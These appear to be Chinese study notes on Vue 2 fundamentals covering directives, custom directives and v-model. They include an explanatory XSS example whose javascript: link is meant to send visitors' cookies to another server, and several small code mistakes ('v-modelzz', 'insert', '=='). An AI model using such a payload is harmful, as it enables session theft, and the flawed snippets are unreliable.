### 带学的知识点：
> addRoutes 的使用
- https://www.cnblogs.com/zhuhuoxingguang/p/11759001.html
- https://www.jianshu.com/p/27e304884459


> v-bind 的知识点
- https://juejin.cn/post/6844904101298323470



### Vue
- vue分为插件和核心库, 核心库比较小, 在这做项目的时候再根据需求下载对应的插件
- 作用: 动态构建用户界面

- seed - vue


> Vue 是一个渐进式的框架, 什么是渐进式?
- 你把数据给我 我给你呈现界面 
- 就是假如我们的应用很简单那么我们只需要 引入一个小巧的核心库就可以了
- 如果我们的应用比较复杂，可以引入各式各样的vue插件 

- 比如 Core(vue 核心)+ vue-router(路由) + vuex(状态管理), 可以满足你各种各样的需求


> vue 有很多特点和 web 开发中常见的高级功能
- 采用组件化模式 提高代码复用率 且让代码更好维护
<!-- 
  在vue里面一个.vue文件就是一个组件 它包括 html css js 
 -->

- 声明式编码 让编码人员无需直接操作DOM 提高开发效率
<!-- 
  区别于命令式编码
 -->

- 使用虚拟DOM + 优秀的Diff算法 尽量服用DOM节点
<!-- 
  虚拟DOM就是内存中的数据
 -->

- 前端路由技术
- 状态管理
- 虚拟 DOM


> vue-cli: vue 脚手架
- 帮助我们下载基于vue的项目的 项目写好了配置声明依赖等

--------------------------

### 体验Vue的小案例

--------------------------

### 案例 : Hello Vuejs
- 我们来做我们的第一个 Vue 程序, 体验一下 Vue 的响应式

> 优点:
- 数据和界面可以完全分离
- 当数据发生改变的时候, 页面中的数据会自动发生响应(自动修改为新数据)


> 首先创建 Vue 的实例对象, 并传递了一个配置对象作为参数
    let app = new Vue({ })


> 对象(参数) 中的参数
    let app = new Vue({
        el:'id'          // element: 选择器 -- vue管理的区域
        data: { }        // 数据
    })

- el 属性: 该属性决定了 Vue 对象挂载到哪一个元素上
- data 属性: 该属性中通常定义一些数据(可能是自己定义, 可能是来源于服务器加载)


> 将 Vue 对象中 data 属性里的数据显示在 html 结构中
    {{变量名}}

<!--
    {{message}}就是一个特殊的语法 它会对这个语法进行一个解析 它就会找message这个变量在data中有没有定义
    如果data中有定义 就会把对应的变量的值在div中做一个显示
 -->


> 我们看个小例子:
    <div id="app">
      {{message}}
    </div>

<!--
    实例化Vue的实例 const app = new Vue(), 在创建Vue实例的时候, 我们往里面传递了一个对象{ }
    这个对象可以有一个参数用于挂载我们的元素, 这个元素我们指定了一个id <div id="app"></div>
-->

     const app = new Vue({

<!--
    通过id, 让Vue管理一下这个div, 相当于把页面中的ID为app的div传递给了Vue的实例
    当我们传递给Vue实例的时候, 我们的Vue就会负责帮助我们管理它
 -->
      el:'#app',      // 用于挂载要管理的元素
      data: {         // 定义数据
          message:'你好的 Sam 以后会好的'
      }
    })

--------------------------

### 案例 : 文本框输入文字 页面实时显示
- 要点:
- v-model   双向数据绑定

> v-model
<!-- 
    <div id="app">
        <input type="text" v-model='username'>
        <h3>hello, {{username}}</h3>
    </div>

    // 创建vue实例
    const app = new Vue({
      el: '#app',
      data: {
        username: 'atguigu'
      }
    })
 -->

--------------------------

### 案例 : 列表的展示

- 需求:
- 数据列表, 我们现在从服务器请求过来一个列表, 希望展示到 HTML 中

- HTML 代码中, 使用 v-for 指令

- 这种模式是响应式的 比如我们要往数据里面追加元素的时候, vue 会自己创建新的 li 来装新的数据

<div id="app">
    <ul>
        <!-- 在这里我们使用v-for来遍历我们传递进来的列表 vue会自动解析html中的语法, 所以v-for之所以有意义是因为vue赋予了它意义 -->
        <!-- Vue会自动帮我们创建4个li, 每个li中的元素是不一样的 -->
        <li v-for='item in movies'>{{item}}</li>
    </ul>
</div>

const app = new Vue({
el:'#app',
data: {

<!-- 因为是一个列表所以最好是一个数组 -->
      movies:['海王', '星际穿越', '大话西游', '少年派', '盗梦空间']
    }

})

--------------------------

### 案例 : 计数器

- 点击+ 计数器+1
- 点击- 计数器-1

- 新的属性: methods 属性: 该属性用于在 vue 对象中定义方法
- 新的指令: @click: 该指令用于监听某个元素的点击事件, 并且需要指定当发生点击时, 执行的方法(通常是 methods 中定义的方法)
<!--
    @click 是 v-on的语法糖
 -->

<div id="app">
    <h3><span>当前计数:{{counter}}</span></h3>
<!-- 
    如果代码比较少的话可以在这里面写上counter++
    <button v-on:click='counter--'>-</button>
    <button v-on:click='counter++'>+</button> 
-->
<!-- 
    如果逻辑比较多的时候, 要写在Vue对象的methods中定义
-->
    <button v-on:click='sub'>-</button>
    <button v-on:click='add'>+</button>
</div>

<!-- 声明Vue对象 -->
const app = new Vue({

<!--
    这里并不是绑定给一个单独的元素, 而是绑定给了一个区域 这个区域内都可以被解析
-->
    el:'#app',

<!-- 这里定义了一些数据 -->
    data:{
        counter:0,
    },

<!-- 这里定义了方法 -->
    methods: {
        add:function() {

<!--
    在这里找不到counter 它会去全局里面找

    但是我们整体的代码都是在app内部或者说是new Vue({对象内部})

    所以当我们想取这个对象里的counter变量的话 this.counter 我们要加上this this表示当前对象
 -->
        // counter++;
        this.counter++;
        },

        sub:function() {
            this.counter--;
        }
    }
})

> 对 ↑ 总结:
- 我们在被管理的区域使用插入语法 {{counter}} 这样在 vue 对象里改变该变量的值, 会在文本中自动展示

- 我们把方法定义在了 methods 属性中
-

### 语法糖的意思是简写
- 就是正式的语法写起来太麻烦了, 给你有点甜头的写法

--------------------------

### Vue.js 安装

> 方式一: 直接 CDN 的引入
<!-- 开发环境版本，包含了有帮助的命令行警告 -->
<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>

<!-- 生产环境版本，优化了尺寸和速度 -->
<script src="https://cdn.jsdelivr.net/npm/vue"></script>


> 方式二:下载和引入
<!-- 开发环境 -->
https://vuejs.org/js/vue.js

<!-- 生产环境 -->
https://vuejs.org/js/vue.min.js


> 方式三: npm 安装
- 学习到中间项目的时候会用到这种方式下载, 后续通过 webpack 和 cli 的使用

--------------------------

### VueJs DevTools
- 安装完后 控制台上会出现一个vue面板
- 里面的一个root代表了一个vue对象


### Vue 中 MVVM
- 什么是 MVVM 呢?
- Model-View-ViewModel
<!-- 
  v       对应的是html模板
  model   对应data中的数据
  vm      Vue实例对象
 -->

- MVVM 就是将其中的 View 的状态和行为抽象化，让我们将视图 UI 和业务逻辑分开。
- 当有数据需要展示的时候, viewmodel 会自动把数据绑定到 view 上面
- 当 view 有事件触发的时候, 我们也是通过 ViewModel

> Vue 中的 MVVM

                  ViewModel

    View        DOM Listeners       Model
                Data Bindings

    DOM             Vue             Plain JS OBJ


> view 层
- 视图层
- 在我们前端开发中, 通常就是 DOM 层, 主要的作用是给用户展示各种信息


> Model 层
- 数据层
- 数据可能是我们固定的死的数据, 更多的是来自我们服务器, 从网络上请求下来的数据
- 我们计数器的案例中, 就是后面抽取出来的 obj, 当然 里面的数据可能没有这么简单


> vueModel 层
- 纽带
- 视图模型层
- 视图模型层是 view 和 model 沟通的桥梁
- 一方面它实现了 data binding 也就是数据绑定, 将 model 的改变实时的反应到 view 中
- 另一方面它实现了 DOM listener 的监听, 当 dom 发生了一些事件(点击 滚动 touch 等)时, 可以监听到, 并在需要的情况下改变对应的 data


> MVVM 
- M
  是数据对象(data) 数据是给视图用, 自动能读

- V
  是html中的被vue管理的部分, 比如div id='app'

- VM
  是视图模型 vue new出来的实例 
  - 数据绑定  实现的效果 视图能够从data里面读数据
  - DOM监听

--------------------------

### Vue的使用 引入JS版
- 跟jQ的使用方式一样，通过script标签引入Vue文件 引入后全局会多了一个Vue全局对象

- 我们在引入 Vue.js 的时候如果是开发版本 控制台会输出警告 如果不希望有警告的话我们可以使用 Vue.config 来进行配置


> Vue.config
- 它是一个对象 包含Vue的全局配置 可以在启动之前修改下列的property
- 一次修改全局都用

- 属性：
    - productionTip   Boolean 默认值 true
      设置为 false 以阻止vue在启动时生成生产提示

--------------------------

### 创建 Vue 实例
- 容器和Vue实例是一对一的关系
<!-- 
  // root容器里的代码被称为 Vue 模板
  <div id='root'>
    <h3>hello, {{title}}</h3>
  </div>


  Vue.config.productionTip = false
  new Vue({
    el:'#root',
    data: {
      title: 'sam'
    }
  })
 -->

> Vue实例：el
- 通过该配置项指定Vue管理的实例，值通常为css选择器字符串
<!-- 
  new Vue({
    el:'#root',
    el: document.querySelector('#root')
 -->

> Vue实例：data
- data中用于存储数据 数据供el所指定的容器去使用
- 类型: object | function
<!-- 在组件当中 data 必须是一个函数 -->

- 作用: Vue 实例对应的数据对象
- data中的一组组kv最终都会在vue实例上
<!-- 
  直接会在 this 上 也就是展开组件直接能看到data中的数据
 -->

- 只有配置在data中的数据 才会做数据代理 和 数据劫持
- data中的数据发生变化 模板就会重新解析 用到data中的数据的地方就会被重新执行


> Vue实例：methods
- 配置在这里面的方法要么是回调 要么放在生命周期里面调用

- 标签中的数据可以通过实参传递进来
- 类型: {[key]:function}
- 作用: 定义属于 Vue 的一些方法, 可以在其他地方调用, 也可以在指令中使用

<!--
    什么是函数 什么是方法
    方法:method 在类里面定义的叫做方法 方法一般都是和实例挂钩的
    函数:function
 -->

**注意：一旦data中的数据发生改变 界面里的用到该数据的地方也会发生改变**


> Vue实例：template
- 我们都是在 div#root里面写模板 其实这个区域可以不写任何东西
<!-- 
  <div id="root">
    <h3>放大10倍后的值是：<span v-big='number'></span></h3>
    <input type="text" v-fbind:value='number'>
  </div>


  <div id="root">

  </div>
 -->

- 我们可以传入 template配置项 在里面写 模板的部分 vue在解析的时候会解析template中传入的模板 template的值是一个字符串

**注意：**
- 1. 我们要使用模板字符串的形式
- 2. 多个结构的时候外层要套一个div
- 3. 使用template配置项的时候 vue在解析模板 挂载模板的时候 div#root会被template中内容完全替换 挂载到页面上的 仅是以<div>包裹器来的元素</div>
<!-- 
  new Vue({
    el: '#root',
    template: `
      <div>
        <h3>放大10倍后的值是：<span v-big='number'></span></h3>
        <input type="text" v-fbind:value='number'>
      </div>
    `
 -->


> Vue实例：watch
> Vue实例：computed
> Vue实例：filters
> Vue实例：directives

> Vue实例：components
- 用于注册局部组件 类型是对象
<!-- 
  components: {
    组件的名字： 创建组件时的变量名   
              // 这才是给组件起名字 创建组件时的变量名用于找到我们定义的组件
  }
 -->

--------------------------

### el 和 data 的两种方式
> el的代替方式：
- 我们使用Vue原型对象上的方法 $mount 来挂载容器
<!-- 
  let vm = new Vue({
    data: {
      name: 'sam'
    }
  })

  vm.$mount('#root')
 -->


> data的代替方式
- 上面我们一直使用的data对象式写法 它也可以写成函数式 函数内部必须return 一个对象
- 函数
<!-- 
  data: {}

  // 第二种
  data() {
    return {
      name: 'sam'
    }
  }
 -->

- data() {} 函数是Vue帮我们调用的 该函数的this是Vue实例对象
- 一般在对象中写函数都会写成es6简写方式

**注意：这里不能使用 箭头函数的方式 this的指向会变成window**
- 由Vue管理的函数一定不要写箭头函数 一旦写了箭头函数 this就不再是Vue实例而是window

--------------------------

### 模板语法
- 插值的相关操作都是把变量放入文本中显示 
- 所有写表达式的地方 vm 身上的所有东西都可以写

- 模板中的{{ }}中可以直接使用vm身上的属性和方法不用加this，同时模板中出现的属性和方法也只会去vm中查找 按着原型链
<!-- 
  {{alert}}   就会报错vm身上没有alert方法

  解决办法
  data: {
    window: window
  }
  {{winodw.alert}}


  <li>{{console.log(count)}}</li>   // 报错
  
  // 解决办法
  data() {
    return { window: window }
  },
  <li>{{winodw.console.log(count)}}</li>
 -->


> 插值语法 {{ }}
- 花括号中可以写js表达式 可以
- 在 Mustache 语法中 不仅仅可以直接写变量, 也可以写简单的表达式
- 往往用于处理标签体内容

<!--
    <h2>{{message}}</h2>
    <h2>{{message}}, 我是文本</h2>
    <h2>{{firstName + lastName}}</h2>       // kobebryant
    <h2>{{firstName +' '+ lastName}}</h2>   // kobe bryant
    <h2>{{firstName}} {{lastName}}</h2>

    // 直接显示
    <h2>{{counter}}</h2>

    // 显示counter的2倍
    <h2>{{counter*2}}</h2>

    data: {
      message:'你好啊',
      firstName:'kobe',
      lastName: 'bryant',
      counter:100
    }
 -->

--------------------------

### 指令语法
- 往往用于解析标签属性(包括 标签属性 标签体内容 绑定事件)

> v-once
- 该指令后面不需要跟任何表达式
- 该指令表示元素和组件只会渲染一次, 不会随着数据的改变而改变(不会因为改变 data 里面的数据, 响应到 dom 中)
<!--
  在某些情况下, 我们可能不希望界面随意的跟随改变, 
  这个时候我们就可以使用这个指令
-->

- v-once所在节点在初次动态渲染后 就视为静态内容了
- 以后数据的改变不会引起v-once所在结构的更新 可以用于优化性能

<!--
  <h2 v-once>{{message}}</h2>
  后续修改message里面的值 页面中显示的还是第一次的值
 -->

- 工作中的应用场景
- 有的时候 只想让这个功能实现一次 我们就使用了once 但是如果发生了网络错误之类的现象 用户点击了一次之后不能再次点击了 体验不好 这是后我们就搭配上了 try catch
<!-- 
  try {

  } catch() { 在这里再次的绑定了once事件 }
 -->


> v-html
- 它和v-text很想 唯一的区别就是 当它对应的值中含有标签的时候 v-html会对标签进行解析
- 该指令后面往往会跟上一个 string 类型, 会将 string 的 html 解析出来并且进行渲染
<!--
  <h2 v-html='message'></h2>    // 结果：hello

  data: {
    message:'<div>hello</div>',
  }
-->

> xss攻击
- v-html有安全性的问题
- 在网站上动态渲染任意html是非常危险的 容易导致xss攻击
**一定要在可信的内容上使用v-html 永远不要用在用户提交的内容上**

<!-- 
  // XSS攻击

  // 先铺垫两个知识点：
  1.
  document.cookie   // 可以拿到当前网站上所有的cookie

  2. 
  <a href=javascript:location.href="坏人准备干坏事的网站">
      // a标签内容还可以这么写代码

  说说什么是xss攻击，我们在登录一个网站的时候 如果成功登录后 目标服务器会返回给客户端cookie存储在用户的浏览器里面

  每一个网站发送过来的cookie都是以网站为单位存储的
  该cookie就相当于用户在目标网站的身份证 有了cookie甚至可以免登录

  假如我们弄丢了cookie 被别人拿到 那么这个人就可以导入我们的cookie伪装成我们免密登录目标网站


  那什么场景下会被坏人利用这点呢
  比如 百度贴吧 我们用户可以发送留言 发送的留言都会保存在数据库中 然后程序员拿到数据后通过遍历 动态的渲染到页面结构里


  假如 有坏人 以下面的方式 留言
  <a 
  href=javascript:location.href="http://www.baidu.com?document.cookie"
  >有妞</a>
      // 该段代码意思是 带着当前正在浏览的网站上的所有cookie访问坏人的服务器并将cookie传递给坏人的服务器

  假如 我们程序员 整好 使用v-html来根据留言数据 渲染页面就会造成 这段代码被解析成一个标签 

  如果有人点击后 后果不堪设想



  当然cookie也有验证 需要在后端设置 给敏感数据 比如cookie设置 HttpOnly 这样只有浏览器才能读取cookie并携带cookie其它人都不可以

  document.cookie也不能读取cookie 为空
 -->


> v-text 
- 向其所在的标签插入文本 插入内部再标签属性中完成 标签体内容为空
- 如果 v-text对应的 值里有标签体类型的文本 它不会解析成标签 只是当字符串来解析
<!-- 
  <h2 v-text='message'></h2>    // 结果：<div>hello</div>

  data: {
    message:'<div>hello</div>',
  }
 -->

- v-text 作用和 Mustache 比较相似, 都是用于将数据显示在界面中
- v-text 通常情况下, 接收一个 string 类型
- 但是该方法不够灵活 它会拿到message的值覆盖掉标签中原有的文本
<!--
    <h2>{{message}}</h2>
    <h2 v-text='message'></h2>      // 结果一样

    data: {
        message:'你好啊',
    }


    // 不够灵活
    <h2>{{message}}, sam</h2>           // 你好啊, sam
    <h2 v-text='message'>, sam</h2>     // 只有你好啊 
                                           会覆盖掉 (, sam)
 -->


> v-pre
- v-pre 用于跳过这个元素和它子元素的编译过程
- 可以利用它跳过 没有使用指令语法 没有使用插值语法的节点 会加快编译
<!-- 
  一般我们都会给 没有vue语法的节点加v-pre 这样vue就不用分析该节点了 跳过了编译过程
 -->

- <pre></pre>的效果相似 在该标签里面的内容会原封不动的给你展示出来
<!--
    <h2>{{message}}</h2>            // 你好啊
    <h2 v-pre>{{message}}</h2>      // {{message}}

    data: {
      message:'你好啊',
    }
 -->


> v-cloak
- 应用场景：
- 当网速过慢的时候 不让未经解析的模板跑到页面上去
- 该方法需要 v-cloak 配合 css 来使用

- 使用方式：
- 1. 在目标标签里面 使用 v-cloak
<!-- 
  v-cloak 会在vue接管的一瞬间被删掉
 -->

- 2. 配置css样式 
<!-- 
  [v-cloak] {
    display:none;
  }
 -->


- js基础的时候我们就了解过js阻塞的概念
<!-- 
  js    这里我要是加载一个js文件 要花费 5s 的时间
  html  这里就会等待5s后才会渲染出结果
 -->
- 上面的这种情况下页面就会出现短暂的空白时间


- 那假如是下面的情况
<!-- 
  html   {{name}}
  js     这里我要是加载一个js文件 要花费 5s 的时间
  vue    这里就会等待5s后 vue才能功能 接管上面的html部分
 -->
- 上面的这种情况 页面会 展示 {{name}} 近5秒的时间


- 为了解决这个问题 我们可以在标签内部加上v-cloak这个属性
<!-- 
  CSS部分:
    [v-cloak] {
      display:none;
    }


  HTML部分:
    <div id="app">
      <h2 v-cloak>{{message}}</h2>
    </div>


  JS部分:
    const app = new Vue({
      el:'#app',
      data: {
        message:'你好啊',
      }
    })
 -->

--------------------------

### 自定义指令
- 上面介绍的都是vue帮我们写好的指令我们都是直接拿过来使用的 也就是内置指令
- 内置指令的背后也是在用操作dom的方式 也就是说 自定义指令是对原生操作dom的方式进行的封装

- 需求：
- 定义一个 v-big指令   效果和v-text类似 但可以把绑定的数值放大10倍
- 定义一个 v-fbind指令 效果和v-bind类似 但可以让其所绑定的input元素默认获取焦点

> 使用 Vue实例中的 配置项 directives : { }
- 配置自定义指令 v-big
- 在 directives 里面配置的时候 直接写 big 
- 在模版中使用的时候再加 v-
<!-- 
  directives: { big: { } },
  directives: { big() { } }
 -->

- big的配置有两种书写方式 对象 和 函数 
- 对象的优势在于可以处理细节上的东西

- 所谓的自定义指令就是一个函数 由vue帮我们调用
<!-- 
  <h3>放大10倍后的值是：<span v-big='number'></span></h3>

  data() {
    return {
      number: 50
    } 
  },

  directives: {
    big: {
      k: v
      k: v
      k: v
    }


    或者

    big(element，binding) { }
  }
 -->


> 效果:
- 在标签属性内部使用 v-big 传入的数据 会经过v-big处理后 展示到 标签体中


> 注意:
- 自定义属性传递进来的数据 必须是在组件身上定义过的 比如必须在data身上配置过
- 因为它也要保证自定义属性 数据的响应式


> 函数式的自定义指令
- <span v-big='number'></span>
- 函数式 自定义指令 中的参数
- big(参数1, 参数2) { }

- 参数1：element 当前v-big所在的真实DOM  <span></span> 也就是Dom节点

- 参数2：
  binding： v-big 所绑定的标签对象 内部有很多的属性

  binding.value：
           就是标签属性中在使用 v-big 时传递进来的数据
  <!-- 
    binding.value == v-big='number'中的number == 50

    data() {
      return {
        number: 50   ===   binding.value
      } 
    },
   -->

  
- 实现需求1：
- 当使用v-big指令的时候 同v-text使用方式一样 将结果x10放到标签体中
<!-- 
  directives: {
    big(el, binding) {

      // 这里也是使用 原生js的方式 写的逻辑
      el.innerHTML = binding.value * 10
    }
  }
 -->


> 自定义指令 函数式的调用时机
- 也就是上面 big函数 什么时候会被调用
- 1. 指令与元素成功绑定的时候 初始的时候
- 2. 自定义指令函数中所依赖的数据发生变化的时候 该函数会被重新调用
<!-- 
  更加准确的说法是 指令所在的模板重新解析的时候 该函数都会被重新调用
 -->


> 对象式的自定义指令
- <span v-fbind='number'></span>

- 对象式的方式具有像生命周期式的性质 在下面的3种情况下会被触发
- 1. 指令和元素成功绑定
- 2. 已绑定指令的元素被 挂载 到页面
- 3. 已绑定指令的元素 模版被重新解析

- 一般 1 3 的逻辑是一样的 2的时候有点像 mounted

- 我们先把函数准备好 vue会在对应的实际调用对应的函数
- 下面的函数都能收到 element 和 binding 参数
directives: {
  fbind: {
    bind() {}       // 当指令与元素成功绑定的时该函数会被调用
    inserted() {}   // 指令所在元素被插入页面时该函数会被调用
    update() {}     // 指令在的模板被重新解析时该函数会被调用
  }
}

- 很多情况下 bind函数中的逻辑 和 update函数的逻辑是一样的
- 如果我们使用的简写形式 相当于我们使用了bind 和 update 没有使用inserted

- inserted里面一般是做真实能够操作dom元素的逻辑 比如获取它的父节点等 因为这个时间点元素已经被挂载到页面上了


- 实现需求2：
- 定义一个 v-fbind指令 效果和v-bind类似 但可以让其所绑定的input元素默认获取焦点
<!-- 
  <input type="text" :value='number'>

  directives: {

    fbind(el, binding) {

      // 将输入框的值 修改为 指定绑定的data中变量所对应的值
      el.value = binding.value

      // 自动获取焦点
      el.focus()
          但是我们发现 input并没有获取到焦点 代码肯定是奏效了 只能说明 执行的时机不对

          那 fbind 这个函数是什么时候调用的？
          1. 该指令和元素绑定在一起的时候
          2. 该指令处于的模板被重新解析的时候

          我们的问题就在问题1 fbind 函数会在 指令和元素绑定的时候 这时候仅仅是在内存里面建立了 绑定关系 并没有跑到页面上 就开始被调用 也就是说在元素挂载到页面之前就执行了 focus() 逻辑 所以是不奏效的

      也就是说 el.focus() 这部分的逻辑 要在另一个时机调用
    }



    fbind: {
      bind(el, binding) {
        el.value = binding.value
      },

      insert(el, binding) {
        el.focus()
      },
      

      // 注意 我们要写update 要不vue不知道我们更新的时候要干什么
      updated() {
        el.value = binding.value
      }
    }
  }

  像不像在一个自定义指令中写了3个生命周期函数
 -->


> 自定义指令的坑
- 1. 自定义指令的名字 不要使用驼峰命名法 多个单词之间使用-来连接
- 同时 变量名里面如果使用了 - 我们就要使用引号将它括起来
<!-- 
  v-big-number
  'big-number'() { ... }
 -->

- 2. 自定义指令的函数中的this(也就是directives里面配置的函数中的this)都是window
<!-- 
  我打印了一下 
  函数式的自定义指令中的this是undefined
  对象式的自定义指令中的this式
 -->

- 3. 我们在directives配置的指令都属于局部指令其它的地方用不了


> 全局配置 自定义指令
- 如果是函数式的自定义指令 第二个参数就是一个function() {}
> Vue.directive('指令名', {指令的配置对象})
<!-- 
  Vue.directive('fbind', {
    
    fbind: {
        bind(el, binding) { 
          el.value = binding.value
        },

        insert(el, binding) {
          el.focus()
        },
        
        updated() {
          el.value = binding.value
        }
      }
    }

  })
 -->

--------------------------

### 表单数据的双向绑定 v-model
- 主要使用来捕获用户的输入 影响data中的数据的变化
- 数据不仅能从data流向页面 还可以从页面流向data

- 常用的表单类的元素
  - input
  - radio 
  - checkbox
  - select
  - textarea

- 这些表单类元素都有一个特殊的值 value 我们v-model通常都是绑定在value上的 

**注意：v-model:value='data中的变量' 可以简写成 v-model='data中的变量'**
- 因为 v-model 默认收集的就是value的值


> v-model:表单类属性名
- v-model只能应用在表单类元素上(输入类元素)上 一般都会绑定value
<!-- 
  <input type="text" v-model:value='title'>

  // 简写形式
  <input type="text" v-model='title'>
 -->


### v-model 表单绑定(双向绑定)
- v-model在给变量赋值的时候 赋值的类型都是string类型

- 与表单配合使用的
- 也可以用于textarea元素
- 表单控件在实际开发中是非常常见的, 特别是对用户信息的提交 需要大量的表单
<!-- 
  比如注册页面 登录页面都需要获得用户的登录信息
 -->

> 语法:
- v-model='data中的变量'
- 将用户输入的内容双向绑定到该变量中

- 在Vue中使用 v-model 指令来实现表单元素 和 数据的双向绑定
<!-- 
  <input type="text" v-model='message'>

  这样就实现了双向绑定, 它会把data中的message中的信息, 作为input的value的值
  这样data里面的message就绑定在了input中面了
 -->

> 双向绑定:
- 1. data中的数据被绑定到 input 标签中 做为value, 显示在input的文本框内部
- 2. 修改input文本框中的值, data中的message变量的值也会变化
<!-- 
  以前的响应式:
  将data中的数据, 在界面中实时显示 一旦data中的数据发生改变 界面里的数据也会发生改变
  但是如果修改了页面中的数据 data中的数据是不会变的

  而双向绑定是(跟表单一起用), data里是什么数据 input里面就是什么数据, 同时我们修改了input里面的数据
  data中的数据也会发生变化 这是相互绑定的
 -->


### v-model 原理
- v-model其实是一个语法糖, 它的背后本质上是包含两个操作
- 1. v-bind绑定一个value属性
- 2. v-on指令给当前元素绑定input事件
<!-- 
  <input type="text" v-model='message'>

  等同于

  <input 
    type="text" 
    :value='message' 
    v-on:input='message == $event.target.value'
  >
 -->

> 具体操作:
<!-- 
  1. 首先我们把message绑定到input里面
  <input type='text' v-bind:value='message'>

  2. 接下来我们修改data中的message 也就是实时获取到input中的value的值 赋值给message
    2.1 实时监听input标签 我们要用到 oninput事件
    2.2 input当中的value的值, 我们通过 $event.target.value 来获取

  input有一个事件叫 input 用于实时动态监听用户输入的东西 不用等到失去焦点就会触发

  接下来我们要将用户输入的东西实时的赋值给message 我们要动态的获取input中的value的值

  这个value要通过event来获取, 一旦在我们的界面上产生事件之后浏览器就会生成一个event对象, 这个event对象就包含了我们想要的信息

  <input type="text" :value='message' v-on:input='valueChange'>

  我们再methods中定义方法
  methods: {
    valueChange(event) {
      this.message = event.target.value;
    }
  }
 -->

**注意：**
- 1. 不要使用v-model绑定props属性 因为props属性是只读的

- 2. vue只能浅层次的监视属性改变没有 不能深度监视 当props是一个对象的时候 我们只用v-model绑定props对象里面的一个值 vue是发现不了 但日后可能会出现种种的问题
<!--
  在中川的项目就会发生这样的现象
  中川的目标是在外壳组件中请求数据 将数据通过prop的方式传递到子组件中
  在子组件中 使用 数据判断 或 双向绑定 或 将最后的form拿去当发送请求的对象 

  事实上也不建议这样做 但是中川做的就没问题么？
  v-model="form[n.props]"
-->

--------------------------

### v-model:input
- v-model绑定的就是value值 当绑定input文本框的时候 直接将值value绑定到username里
<!-- 
  <input type='text' v-model='username'>

  data: {
    username: ''
  }
 -->

--------------------------

### v-model:radio
- 简单的复习下
- radio标签是单选框, 当中必须有name属性才能想服务器进行提交, 往往我们在设置radio标签的时候都是两个radio起一样的name属性值, 这样才能起到互斥的效果
<!-- 
  互斥的原因:
  我们在往服务器提交的时候 用name作为键名 提交的name只能有一个
 -->

- radio这种 用户不能敲键盘输入值的 我们需要自己在标签属性中定义value

- 在使用v-model绑定单选框的时候 要注意：
- 1. 单选框组要有 且只有一个name
- 2. 每一个单选框要定义一个对应的value
- 3. v-model绑定的是name对应的属性值
- 这样才能根据用户点击把设定好的value值存到data中的变量中

> radio: v-model='name的值要和data中存储value的变量名一致'
<!-- 
  <form>
    性别：
    男<input type='radio' name='sex' v-model='sex' value='male' > 
    女<input type='radio' name='sex' v-model='sex' value='female'>
  </form>

  data() {
    return {
      sex:''    // 这里决定设置默认值
    } 
  }
 -->

- 注意：
- 原生html中 单选框的默认值 是通过  checked="checked" 添加的
- vue中的默认值需要在data中绑定的变量来设置

--------------------------

### v-model:checkbox

> 多选框的情况下
- 多选的情况下我们需要收集的是value值 是数据 所以

- 我们要是对checkbox这种类型的input 收集数据 要注意以下几点
- 1. 每一个checkbox里 设置 value属性
<!-- 
  checkbox这种 用户不能敲键盘输入值的 我们需要自己在标签属性中定义value
  checkbox类型的input 如果我们不自己定义value 那么它默认读取的就是 checked 这个值 也就是true 或者 false
 -->

- 2. 在data中定义一个数组，我们要将值收集到data中的哪个变量里面去
<!-- 
  用于收集多选框的变量的类型必须是一个数组

  hobby的初始值会影响v-model收集回来的数据 如果是一个字符串 会转成false 这样收集的value会是boolean
 -->


<!--  
  爱好：
    吃饭<input type='checkbox' value='吃饭' v-model='hobby'> 
    睡觉<input type='checkbox' value='睡觉' v-model='hobby'> 
    打豆豆<input type='checkbox' value='打豆豆' v-model='hobby'>

  data() {
    return {
      sex:'',
      hobby: []
    }
 -->


> 单选框的情况下
- 我们不需要收集单选框的数据 我们只需要知道是true 还是 false就可以 所以我们不用在单选的情况下 在标签内部添加value属性

- 直接写v-model=结果存放的变量
<!-- 
  同意<input type='checkbox' v-model='agree'> 

  data() {
    return {
      agree:'',
    }
 -->

--------------------------

### v-model:select

> 选择一个值 变量的类型是字符串
- 我们要是对select这种类型标签 收集数据 要注意以下几点
- 1. 给 select标签绑定 v-model = 将数据收集到哪里
- 2. 第一个option可以是value为空 对应的data中对应的变量的初始值也为空
<!-- 
  <select v-model='city'>
    <option value="">请选择</option>
    <option value="北京">北京</option>
    <option value="上海">上海</option>
    <option value="深圳">深圳</option>
  </select>

  data() {
    return {
      city: ''
    } 
  }
 -->


> 选择多个值 变量的类型是数组
- 可以选中多个值
- v-model 绑定的是一个数组
- 当选中多个值时, 就会将选中额option对应的value添加到数组mySelects中
<!-- 
  给下拉菜单添加 multiple属性后 就可以选择多个选项, 我们按住ctrl选, 选中的选项对应的value会传递到data中的cars的数组中
 
  <select v-model='cars' multiple>
    <option value="volvo">volvo</option>
    <option value="saab">saab</option>
    <option value="opel">opel</option>
  </select>

  let vm = new Vue({
    el:'#app',
    data: {
      cars: []
    }
  })
 -->

--------------------------

### 补充下 form 相关知识
- 使用form提交页面会刷新
- 一般我们都是使用ajax页面无刷新的状态请求数据 或者 发送数据

- 我们点击form标签内部的按钮会后引起默认行为 也就是表单的提交 表单提交后页面会刷新

- form提交的时候 我们可以给form标签绑定submit事件 用于提交数据 同时要注意我们要阻止默认行为


### form表单 点击提交收集数据
- 上面我们将表单内部的所有数据使用v-model绑定在了对应的变量里面
- 接下来我们就要点击提交按钮来发送请求 但是我们怎么将上面零散的数据 收集在一起呢？

<!-- 
  sex:'',
  hobby: [],
  city: ''
 -->

> 方式1：
- 将数据整理到一个userInfo的对象中 
<!-- 
  userInfo: {
    sex:'',
    hobby: [],
    city: ''
  }

  JSON.stringify(this.userInfo)
 -->

--------------------------

### v-model的修饰符
> v-model.lazy  数据在失去焦点 或者 回车时才会更新
- 默认情况下, v-model默认是在input事件中同步输入框的数据的, 也就是说, 一旦有数据发生改变对应的data中的数据就会自动发生改变

- lazy修饰符可以让数据在失去焦点 或者 回车时才会更新
<!-- 
  <input type="text" v-model.lazy='message'>

  双向绑定的好处是 实时更新 但是坏处是改变的频率太高了 有时候我们希望用户敲下回车或者文本框失去焦点后再保存在message变量里 这样的改变的频率就不那么频繁了

  就可以使用这种方式
 -->


> v-model.number
- 默认情况下form里面用户选择的和输入的都是字符串类型 那我们使用v-model收集到对应变量的数据类型也会是字符串类型

- 但是我们收集的数据到最后都会送到服务器然后传到数据库中 比如说年龄 数据库中的年龄字段如果收到字符串类型的数据就会报错

- number修饰符可以让 在输入框输入的内容自动转为数字类型
<!-- 
  <input type="number" v-modelzz.number='message'>

  type="number"   控制我输入的不能是字母
